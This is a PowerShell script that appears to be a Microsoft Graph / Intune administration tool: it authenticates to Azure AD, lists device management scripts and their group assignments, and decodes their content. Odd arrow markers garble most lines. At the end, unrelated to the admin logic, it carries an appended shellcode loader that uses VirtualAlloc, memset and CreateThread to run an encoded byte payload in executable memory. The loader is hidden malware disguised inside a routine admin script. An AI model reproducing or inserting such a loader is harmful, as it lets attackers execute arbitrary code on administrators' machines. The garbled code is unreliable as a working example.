




 -||-> function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User

)

 -||-> $userUpn =  -||-> New-Object "System.Net.Mail.MailAddress" -ArgumentList $User <-||-  <-||- 

 -||-> $tenant = $userUpn.Host <-||- 

 -||-> Write-Host "Checking for AzureAD module..." <-||- 

     -||-> $AadModule =  -||-> Get-Module -Name "AzureAD" -ListAvailable <-||-  <-||- 
    
     -||-> if ( -||-> $AadModule -eq $null <-||- ) {
        
         -||-> Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview" <-||- 
         -||-> $AadModule =  -||-> Get-Module -Name "AzureADPreview" -ListAvailable <-||-  <-||- 

    } <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {
         -||-> write-host <-||- 
         -||-> write-host "AzureAD Powershell module not installed..." -f Red <-||- 
         -||-> write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow <-||- 
         -||-> write-host "Script can't continue..." -f Red <-||- 
         -||-> write-host <-||- 
        exit
    } <-||- 




     -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

         -||-> $Latest_Version = ( -||-> $AadModule | select version | Sort-Object <-||- )[-1] <-||- 

         -||-> $aadModule =  -||-> $AadModule | ? {  -||-> $_.version -eq $Latest_Version.version <-||-  } <-||-  <-||- 

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    }

    else {

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    } <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adal) | Out-Null <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null <-||- 
 


 -||-> $clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547" <-||- 

 -||-> $redirectUri = "urn:ietf:wg:oauth:2.0:oob" <-||- 

 -||-> $resourceAppIdURI = "https://graph.microsoft.com" <-||- 

 -||-> $authority = "https://login.microsoftonline.com/$Tenant" <-||- 

     -||-> try {

     -||-> $authContext =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority <-||-  <-||- 

    
    

     -||-> $platformParameters =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto" <-||-  <-||- 

     -||-> $userId =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ( -||-> $User, "OptionalDisplayableId" <-||- ) <-||-  <-||- 
            
     -||-> $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result <-||- 

    

         -||-> if( -||-> $authResult.AccessToken <-||- ){

        

         -||-> $authHeader = @{
            'Content-Type'= -||-> 'application/json' <-||- 
            'Authorization'= -||-> "Bearer " + $authResult.AccessToken <-||- 
            'ExpiresOn'= -||-> $authResult.ExpiresOn <-||- 
            } <-||- 

        return  -||-> $authHeader <-||- 

        }

        else {

         -||-> Write-Host <-||- 
         -||-> Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 

        break

        } <-||- 

    }

    catch {

     -||-> write-host $_.Exception.Message -f Red <-||- 
     -||-> write-host $_.Exception.ItemName -f Red <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 
 


 -||-> Function Get-DeviceManagementScripts(){



[cmdletbinding()]

param (

    [Parameter(Mandatory=$false)]
    $ScriptId

)

 -||-> $graphApiVersion = "Beta" <-||- 
 -||-> $Resource = "deviceManagement/deviceManagementScripts" <-||- 
    
     -||-> try {

         -||-> if( -||-> $ScriptId <-||- ){

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource/$ScriptId" <-||- 

         -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- 

        }

        else {

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Resource <-||- )?`$expand=groupAssignments" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 

        } <-||- 
    
    }
    
    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Get-AADGroup(){
    

    
[cmdletbinding()]
    
param
(
    $GroupName,
    $id,
    [switch]$Members
)
    

 -||-> $graphApiVersion = "v1.0" <-||- 
 -||-> $Group_resource = "groups" <-||- 
    
     -||-> try {
    
         -||-> if( -||-> $id <-||- ){
    
         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=id eq '$id'" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 
    
        }
    
        elseif( -||-> $GroupName -eq "" -or $GroupName -eq $null <-||- ){
    
         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 
    
        }
    
        else {
    
             -||-> if( -||-> !$Members <-||- ){
    
             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=displayname eq '$GroupName'" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 
    
            }
    
            elseif( -||-> $Members <-||- ){
    
             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=displayname eq '$GroupName'" <-||- 
             -||-> $Group = ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 
    
                 -||-> if( -||-> $Group <-||- ){
    
                 -||-> $GID = $Group.id <-||- 
    
                 -||-> $Group.displayName <-||- 
                 -||-> write-host <-||- 
    
                 -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )/$GID/Members" <-||- 
                 -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 
    
                } <-||- 
    
            } <-||- 
    
        } <-||- 
    
    }
    
    catch {
    
     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break
    
    } <-||- 
    
} <-||- 
    




 -||-> Write-Host <-||- 


 -||-> if( -||-> $global:authToken <-||- ){

    
     -||-> $DateTime = ( -||-> Get-Date <-||- ).ToUniversalTime() <-||- 

    
     -||-> $TokenExpires = ( -||-> $authToken.ExpiresOn.datetime - $DateTime <-||- ).Minutes <-||- 

         -||-> if( -||-> $TokenExpires -le 0 <-||- ){

         -||-> Write-Host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow <-||- 
         -||-> Write-Host <-||- 

            

             -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

             -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
             -||-> Write-Host <-||- 

            } <-||- 

         -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

        } <-||- 
}



else {

     -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

     -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
     -||-> Write-Host <-||- 

    } <-||- 


 -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

} <-||- 





 -||-> $PSScripts =  -||-> Get-DeviceManagementScripts <-||-  <-||- 

 -||-> if( -||-> $PSScripts <-||- ){

     -||-> write-host "-------------------------------------------------------------------" <-||- 
     -||-> Write-Host <-||- 

     -||-> $PSScripts | foreach {

     -||-> $ScriptId = $_.id <-||- 
     -||-> $DisplayName = $_.displayName <-||- 

     -||-> Write-Host "PowerShell Script: $DisplayName..." -ForegroundColor Yellow <-||- 

     -||-> $_ <-||- 

     -||-> write-host "Device Management Scripts - Assignments" -f Cyan <-||- 

     -||-> $Assignments = $_.groupAssignments.targetGroupId <-||- 
    
         -||-> if( -||-> $Assignments <-||- ){
    
             -||-> foreach($Group in  -||-> $Assignments <-||- ){
    
             -||-> ( -||-> Get-AADGroup -id $Group <-||- ).displayName <-||- 
    
            } <-||- 
    
             -||-> Write-Host <-||- 
    
        }
    
        else {
    
         -||-> Write-Host "No assignments set for this policy..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 
    
        } <-||- 

     -||-> $Script =  -||-> Get-DeviceManagementScripts -ScriptId $ScriptId <-||-  <-||- 

     -||-> $ScriptContent = $Script.scriptContent <-||- 

     -||-> Write-Host "Script Content:" -ForegroundColor Cyan <-||- 

     -||-> [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("$ScriptContent")) <-||- 

     -||-> Write-Host <-||- 
     -||-> write-host "-------------------------------------------------------------------" <-||- 
     -||-> Write-Host <-||- 

    } <-||- 

}

else {

 -||-> Write-Host <-||- 
 -||-> Write-Host "No PowerShell scripts have been added to the service..." -ForegroundColor Red <-||- 
 -||-> Write-Host <-||- 

} <-||- 

 -||-> $CCAN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $CCAN -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0xb8,0x8a,0x7b,0xeb,0xc0,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x8e,0x99,0x1e,0x3c,0x66,0xdf,0xe1,0xbd,0x76,0x80,0x68,0x58,0x47,0x80,0x0f,0x28,0xf7,0x30,0x5b,0x7c,0xfb,0xbb,0x09,0x95,0x88,0xce,0x85,0x9a,0x39,0x64,0xf0,0x95,0xba,0xd5,0xc0,0xb4,0x38,0x24,0x15,0x17,0x01,0xe7,0x68,0x56,0x46,0x1a,0x80,0x0a,0x1f,0x50,0x37,0xbb,0x14,0x2c,0x84,0x30,0x66,0xa0,0x8c,0xa5,0x3e,0xc3,0xbd,0x7b,0x35,0x9a,0x1d,0x7d,0x9a,0x96,0x17,0x65,0xff,0x93,0xee,0x1e,0xcb,0x68,0xf1,0xf6,0x02,0x90,0x5e,0x37,0xab,0x63,0x9e,0x7f,0x0b,0x9c,0xd5,0x89,0x68,0x21,0xee,0x4d,0x13,0xfd,0x7b,0x56,0xb3,0x76,0xdb,0xb2,0x42,0x5a,0xba,0x31,0x48,0x17,0xc8,0x1e,0x4c,0xa6,0x1d,0x15,0x68,0x23,0xa0,0xfa,0xf9,0x77,0x87,0xde,0xa2,0x2c,0xa6,0x47,0x0e,0x82,0xd7,0x98,0xf1,0x7b,0x72,0xd2,0x1f,0x6f,0x0f,0xb9,0x77,0x5c,0x22,0x42,0x87,0xca,0x35,0x31,0xb5,0x55,0xee,0xdd,0xf5,0x1e,0x28,0x19,0xfa,0x34,0x8c,0xb5,0x05,0xb7,0xed,0x9c,0xc1,0xe3,0xbd,0xb6,0xe0,0x8b,0x55,0x47,0x0d,0x5e,0xc3,0x42,0x99,0xa1,0xbc,0x4d,0x3e,0x4a,0xbf,0x4d,0xdf,0x1a,0x36,0xab,0x8f,0x4a,0x19,0x64,0x6f,0x3b,0xd9,0xd4,0x07,0x51,0xd6,0x0b,0x37,0x5a,0x3c,0x24,0xdd,0xb5,0xe9,0x1c,0x49,0x2f,0xb0,0xd7,0xe8,0xb0,0x6e,0x92,0x2a,0x3a,0x9d,0x62,0xe4,0xcb,0xe8,0x70,0x90,0x3b,0xa7,0x2b,0x36,0x43,0x1d,0x41,0xb6,0xd1,0x9a,0xc0,0xe1,0x4d,0xa1,0x35,0xc5,0xd1,0x5a,0x10,0x5e,0xdb,0xce,0xdb,0x08,0x24,0x1f,0xdc,0xc8,0x72,0x75,0xdc,0xa0,0x22,0x2d,0x8f,0xd5,0x2c,0xf8,0xa3,0x46,0xb9,0x03,0x92,0x3b,0x6a,0x6c,0x18,0x62,0x5c,0x33,0xe3,0x41,0x5c,0x0f,0x32,0xaf,0x2a,0x61,0x86 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $ByK=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $ByK.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$ByK,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



